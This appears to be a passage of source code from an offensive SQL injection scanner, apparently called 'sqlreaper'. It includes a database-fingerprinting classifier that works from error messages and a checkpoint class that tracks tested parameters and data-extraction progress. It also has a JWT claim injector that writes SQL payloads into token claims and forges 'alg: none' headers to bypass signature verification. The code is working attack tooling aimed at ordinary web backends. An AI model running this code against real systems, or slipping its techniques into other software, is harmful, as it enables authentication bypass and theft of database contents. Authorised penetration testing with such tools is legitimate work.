#  Enhancement 15: Error Message ML Classifier 

class ErrorMessageClassifier:
    """
    Lightweight ML classifier for identifying DBMS from error messages.

    Uses TF-IDF-like feature extraction on error message tokens to classify
    the database type. Handles partial, obfuscated, and non-English errors.

    Features:
      - Token frequency analysis (specific SQL keywords per DBMS)
      - Error code patterns (ORA-, PG, HY000, etc.)
      - Function name detection (specific to each DBMS)
      - Structural patterns (error message format)
    """

    # Discriminative tokens per DBMS (high TF-IDF weight)
    DISCRIMINATIVE_TOKENS: Dict[str, List[str]] = {
        "MySQL": ["mysql", "mariadb", "1064", "1045", "hy000", "mysqld",
                  "sql_mode", "innodb", "myisam", "/*!"],
        "MSSQL": ["microsoft", "sql server", "mssql", "nvarchar", "varchar",
                  "sp_", "xp_", "sysobjects", "syscolumns", "ntext", "msg "],
        "PostgreSQL": ["postgresql", "pg_", "pgsql", "error:", "hint:",
                       "position:", "::text", "::int", "regclass"],
        "Oracle": ["ora-", "oracle", "pl/sql", "v$", "dba_", "all_",
                   "user_", "rownum", "nvl", "sysdate", "dual"],
        "SQLite": ["sqlite", "sqlite3", "near \"", "unrecognized token",
                   "no such table", "no such column"],
        "DB2": ["db2", "sqlcode", "sqlstate", "sysibm", "sqlerrd"],
    }

    @classmethod
    def classify(cls, error_text: str) -> Tuple[str, float]:
        """Classify error message and return (dbms, confidence)."""
        error_lower = error_text.lower()
        scores: Dict[str, float] = {}

        for dbms, tokens in cls.DISCRIMINATIVE_TOKENS.items():
            score = 0.0
            matched = 0
            for token in tokens:
                if token in error_lower:
                    score += 1.0 / len(tokens)
                    matched += 1
            if matched > 0:
                # Boost score for multiple token matches
                scores[dbms] = score * (1 + 0.2 * (matched - 1))

        if not scores:
            return ("Unknown", 0.0)

        best_dbms = max(scores, key=scores.get)
        confidence = min(1.0, scores[best_dbms])
        return (best_dbms, confidence)


#  Enhancement 16: Scan Checkpoint/Resume 

class ScanCheckpoint:
    """
    Saves scan state to disk for crash recovery and resume.

    Periodically serializes: discovered params, tested payloads,
    confirmed injections, and extraction progress. On restart,
    loads checkpoint and skips already-completed work.
    """

    def __init__(self, checkpoint_file: str = ".sqlreaper_checkpoint.json"):
        self._file = checkpoint_file
        self._state: Dict[str, Any] = {
            "version": "20.0",
            "started_at": time.time(),
            "params_tested": [],
            "params_confirmed": [],
            "extraction_progress": {},
            "total_requests": 0,
        }

    def save(self):
        """Save current state to checkpoint file."""
        self._state["saved_at"] = time.time()
        try:
            # TODO: Replace with aiofiles for async I/O
            with open(self._file, 'w') as f:
                json.dump(self._state, f, indent=2)
        except Exception as e:
            LOG.debug(f"Checkpoint save failed: {e}")

    def load(self) -> bool:
        """Load checkpoint from file. Returns True if loaded successfully."""
        try:
            # TODO: Replace with aiofiles for async I/O
            with open(self._file, 'r') as f:
                saved = json.load(f)
            if saved.get("version", "").startswith("20"):
                self._state = saved
                return True
        except (FileNotFoundError, json.JSONDecodeError):
            pass
        return False

    def mark_param_tested(self, param: str, url: str):
        """Mark a parameter as fully tested."""
        key = f"{url}:{param}"
        if key not in self._state["params_tested"]:
            self._state["params_tested"].append(key)

    def is_param_tested(self, param: str, url: str) -> bool:
        """Check if a parameter was already tested."""
        return f"{url}:{param}" in self._state["params_tested"]

    def mark_extraction_progress(self, key: str, extracted: str):
        """Save extraction progress for resume."""
        self._state["extraction_progress"][key] = extracted

    def get_extraction_progress(self, key: str) -> str:
        """Get previously extracted data for resume."""
        return self._state["extraction_progress"].get(key, "")

    def cleanup(self):
        """Remove checkpoint file after successful scan."""
        try:
            import os
            os.remove(self._file)
        except FileNotFoundError:
            pass


#  Enhancement 17: JWT Claim Injection 

class JWTClaimInjector:
    """
    Injects SQL payloads into JWT (JSON Web Token) claims.

    Many backends extract JWT claims (sub, email, role, custom fields)
    and use them in SQL queries without sanitization. By modifying
    JWT claims, SQL injection can be achieved through authentication tokens.

    Supports:
      - Unsigned JWTs (alg: none)
      - JWTs with weak secrets (brute-forceable)
      - JWTs where signature isn't verified by backend
    """

    @staticmethod
    def decode_jwt(token: str) -> Tuple[Dict, Dict, str]:
        """Decode JWT into (header, payload, signature)."""
        parts = token.split('.')
        if len(parts) != 3:
            return {}, {}, ""
        try:
            # Add padding
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            return header, payload, parts[2]
        except Exception:
            return {}, {}, ""

    @staticmethod
    def encode_jwt(header: Dict, payload: Dict, signature: str = "") -> str:
        """Encode JWT from components."""
        # BUG-FIX-3: Safe decode operation
        h = ""
        try:
            h = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).rstrip(b'=').decode()
        except (UnicodeDecodeError, AttributeError, TypeError):
            h = "" # Fallback
        # BUG-FIX-3: Safe decode operation
        p = ""
        try:
            p = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).rstrip(b'=').decode()
        except (UnicodeDecodeError, AttributeError, TypeError):
            p = "" # Fallback
        return f"{h}.{p}.{signature}"

    @classmethod
    def inject_claim(cls, token: str, claim: str, sql_payload: str) -> str:
        """Inject SQL payload into a specific JWT claim."""
        header, payload, sig = cls.decode_jwt(token)
        if not payload:
            return token
        payload[claim] = sql_payload
        # Try alg:none bypass
        header_none = dict(header)
        header_none["alg"] = "none"
        return cls.encode_jwt(header_none, payload, "")

    @classmethod
    def generate_variants(cls, token: str, sql_payload: str) -> List[Tuple[str, str]]:
        """Generate multiple JWT injection variants for different claims."""
        header, payload, sig = cls.decode_jwt(token)
        if not payload:
            return []

        variants = []
        # Try injecting into each claim
        injectable_claims = ["sub", "email", "name", "role", "user",
                              "username", "id", "uid", "user_id"]
        for claim in injectable_claims:
            if claim in payload:
                modified = cls.inject_claim(token, claim, sql_payload)
                variants.append((claim, modified))

        # Also try custom claims
        for claim in payload:
            if claim not in ("iat", "exp", "nbf", "iss", "aud", "jti"):
                modified = cls.inject_claim(token, claim, sql_payload)
                variants.append((claim, modified))

        return variants



